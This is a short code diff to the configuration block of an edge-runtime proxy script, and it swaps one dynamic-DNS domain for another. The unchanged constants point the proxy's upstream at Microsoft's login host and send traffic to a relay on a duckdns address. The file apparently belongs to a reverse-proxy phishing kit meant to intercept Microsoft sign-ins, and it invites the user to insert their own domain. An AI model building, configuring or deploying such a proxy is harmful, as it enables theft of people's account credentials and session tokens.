@@ -1,7 +1,7 @@
 export const runtime = 'edge';
 
 // ==================== CONFIG ====================
-const YOUR_DOMAIN = 'verceldata.camdvr.org'; // Change to your domain
+const YOUR_DOMAIN = 'proxyapp.ddns.net'; // Change to your domain
 const VERCEL_URL = 'https://treydatapi.duckdns.org/api/relay';
 const INITIAL_UPSTREAM = 'login.microsoftonline.com';
 const PROXY_PREFIX = '/_p/';
